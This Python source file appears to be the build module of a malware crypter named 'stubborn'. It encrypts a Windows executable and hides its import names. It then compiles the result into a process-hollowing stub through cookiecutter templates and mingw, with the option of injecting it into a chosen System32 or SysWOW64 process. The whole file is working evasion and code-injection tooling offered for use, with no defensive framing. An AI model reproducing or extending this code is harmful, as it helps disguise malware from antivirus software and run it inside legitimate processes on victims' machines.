from cookiecutter.main import cookiecutter
import os
import pefile
import secrets
import subprocess
import uuid

from encryption import *


def build(file_data, target_exe="same", build_type="release", key_type="randomKey", key_length="32", custom_key=""):
    if key_type == "userKey":
        key = bytearray(custom_key, encoding="utf-8")
        key_length = len(custom_key)
    else:
        key = secrets.token_bytes(key_length)
    imports_key_length = 11
    imports_key = secrets.token_bytes(imports_key_length)
    encrypted_data = encrypt(key, file_data)
    temp_path = os.path.join("/stubborn/tmp", str(uuid.uuid4()))
    pe = pefile.PE(data=file_data)
    compiler, windres = get_compiler_windres(pe.OPTIONAL_HEADER.Magic)
    target_exe_type, target_exe = get_target_exe(target_exe, pe.OPTIONAL_HEADER.Magic)
    if not compiler or not windres:
        return
    cookiecutter_data = {
        "target_dir": temp_path, "encryption_key": decode_key(key), "key_length": key_length,
        "target_exe_type": target_exe_type, "target_exe": target_exe, "build_type": build_type.capitalize(),
        "compiler": compiler, "windres": windres, "imports_key": decode_key(imports_key),
        "imports_key_length": imports_key_length
    }
    cookiecutter_data.update(get_encrypted_imports(imports_key))
    cookiecutter("/stubborn/stub_templates/process_hollowing/", no_input=True, extra_context=cookiecutter_data)
    encrypted_file = os.path.join(temp_path, "crypt.exe")
    with open(encrypted_file, mode="wb") as f:
        f.write(encrypted_data)
    os.mkdir(os.path.join(temp_path, "cmake"))
    subprocess.call(["cmake", "../"], cwd=os.path.join(temp_path, "cmake"))
    subprocess.call(["make"], cwd=os.path.join(temp_path, "cmake"))
    file_path = os.path.join(temp_path, "cmake", "stubborn")
    if os.path.isfile(file_path):
        return file_path
    else:
        return None


def get_compiler_windres(pe_arch):
    if pe_arch == pefile.OPTIONAL_HEADER_MAGIC_PE:
        return "i686-w64-mingw32-g++", "i686-w64-mingw32-windres"
    if pe_arch == pefile.OPTIONAL_HEADER_MAGIC_PE_PLUS:
        return "x86_64-w64-mingw32-g++", "x86_64-w64-mingw32-windres"
    return None, None


def get_target_exe(target_exe, pe_arch):
    if target_exe == "same":
        return "TARGET_TYPE_SELF", ""
    if pe_arch == pefile.OPTIONAL_HEADER_MAGIC_PE:
        return "TARGET_TYPE_OTHER", "C:\\Windows\\SysWOW64\\{}.exe".format(target_exe)
    if pe_arch == pefile.OPTIONAL_HEADER_MAGIC_PE_PLUS:
        return "TARGET_TYPE_OTHER", "C:\\Windows\\System32\\{}.exe".format(target_exe)
    return None, None
